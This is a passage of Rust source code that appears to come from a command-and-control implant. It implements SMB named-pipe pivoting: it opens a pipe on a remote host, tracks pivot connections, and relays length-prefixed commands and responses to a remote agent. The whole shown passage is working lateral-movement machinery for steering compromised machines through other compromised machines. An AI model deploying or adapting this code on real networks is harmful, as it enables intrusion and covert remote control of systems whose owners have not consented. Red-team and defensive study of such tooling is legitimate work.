    let pipe_path = format!("\\\\{}\\pipe\\{}", host, pipe_name);
    let pipe_wide: Vec<u16> = pipe_path.encode_utf16().chain(std::iter::once(0)).collect();

    let handle = unsafe {
        CreateFileW(
            PCWSTR(pipe_wide.as_ptr()),
            (GENERIC_READ.0 | GENERIC_WRITE.0).into(),
            FILE_SHARE_READ | FILE_SHARE_WRITE,
            None,
            OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL,
            None, // No template file
        )
    };

    match handle {
        Ok(h) => {
            let pivot_id = PIVOT_ID_COUNTER.fetch_add(1, Ordering::SeqCst);

            // Store the pivot connection with the handle kept open
            PIVOT_STORE.write().insert(pivot_id, PivotConnection {
                handle: h,
                host: host.to_string(),
                pipe_name: pipe_name.to_string(),
                status: "Connected".to_string(),
                bytes_sent: 0,
                bytes_received: 0,
            });

            (true, CommandResponseData::PivotConnected {
                pivot_id,
                host: host.to_string(),
                pipe_name: pipe_name.to_string(),
            })
        }
        Err(e) => {
            (false, CommandResponseData::Error {
                message: format!("Failed to connect to pivot {}: {}", pipe_path, e),
            })
        }
    }
}

/// Write data to a pivot connection
pub fn pivot_write(pivot_id: u32, data: &[u8]) -> Result<usize, String> {
    let mut store = PIVOT_STORE.write();

    let conn = store.get_mut(&pivot_id)
        .ok_or_else(|| format!("Pivot {} not found", pivot_id))?;

    let mut bytes_written: u32 = 0;

    let result = unsafe {
        WriteFile(
            conn.handle,
            Some(data),
            Some(&mut bytes_written),
            None,
        )
    };

    match result {
        Ok(_) => {
            conn.bytes_sent += bytes_written as u64;
            Ok(bytes_written as usize)
        }
        Err(e) => {
            conn.status = format!("Write error: {}", e);
            Err(format!("Failed to write to pivot: {}", e))
        }
    }
}

/// Read data from a pivot connection
pub fn pivot_read(pivot_id: u32, buffer: &mut [u8]) -> Result<usize, String> {
    let mut store = PIVOT_STORE.write();

    let conn = store.get_mut(&pivot_id)
        .ok_or_else(|| format!("Pivot {} not found", pivot_id))?;

    let mut bytes_read: u32 = 0;

    let result = unsafe {
        ReadFile(
            conn.handle,
            Some(buffer),
            Some(&mut bytes_read),
            None,
        )
    };

    match result {
        Ok(_) => {
            conn.bytes_received += bytes_read as u64;
            Ok(bytes_read as usize)
        }
        Err(e) => {
            conn.status = format!("Read error: {}", e);
            Err(format!("Failed to read from pivot: {}", e))
        }
    }
}

/// Disconnect SMB pivot (handle closed via Drop)
pub fn pivot_smb_disconnect(pivot_id: u32) -> (bool, CommandResponseData) {
    let mut store = PIVOT_STORE.write();

    match store.remove(&pivot_id) {
        Some(conn) => {
            // Connection is dropped here, which closes the handle
            (true, CommandResponseData::PivotDisconnected { pivot_id })
        }
        None => {
            (false, CommandResponseData::Error {
                message: format!("Pivot {} not found", pivot_id),
            })
        }
    }
}

/// List active pivot connections
pub fn pivot_list() -> (bool, CommandResponseData) {
    let store = PIVOT_STORE.read();

    let pivots: Vec<PivotInfo> = store.iter().map(|(id, conn)| {
        PivotInfo {
            id: *id,
            host: conn.host.clone(),
            pipe_name: conn.pipe_name.clone(),
            status: format!("{} (TX: {} / RX: {} bytes)",
                conn.status, conn.bytes_sent, conn.bytes_received),
            remote_agent_id: None,
        }
    }).collect();

    (true, CommandResponseData::PivotListResult { pivots })
}

/// Send a command through a pivot to the remote agent
pub fn pivot_send_command(pivot_id: u32, command_data: &[u8]) -> (bool, CommandResponseData) {
    // Write length-prefixed message
    let len = command_data.len() as u32;
    let len_bytes = len.to_le_bytes();

    if let Err(e) = pivot_write(pivot_id, &len_bytes) {
        return (false, CommandResponseData::Error { message: e });
    }

    if let Err(e) = pivot_write(pivot_id, command_data) {
        return (false, CommandResponseData::Error { message: e });
    }

    (true, CommandResponseData::Success {
        message: format!("Sent {} bytes through pivot {}", command_data.len(), pivot_id),
    })
}

/// Receive a response through a pivot from the remote agent
pub fn pivot_receive_response(pivot_id: u32) -> (bool, CommandResponseData) {
    // Read length prefix
    let mut len_bytes = [0u8; 4];
    if let Err(e) = pivot_read(pivot_id, &mut len_bytes) {
        return (false, CommandResponseData::Error { message: e });
    }

    let len = u32::from_le_bytes(len_bytes) as usize;

    // Sanity check
    if len > 10 * 1024 * 1024 {
        return (false, CommandResponseData::Error {
            message: format!("Response too large: {} bytes", len),
        });
    }

    // Read the full message
    let mut buffer = vec![0u8; len];
    let mut total_read = 0;

    while total_read < len {
        match pivot_read(pivot_id, &mut buffer[total_read..]) {
            Ok(n) if n > 0 => total_read += n,
            Ok(_) => break,
            Err(e) => return (false, CommandResponseData::Error { message: e }),
        }
    }

    (true, CommandResponseData::PivotData {
        pivot_id,
        data: buffer,
    })
}
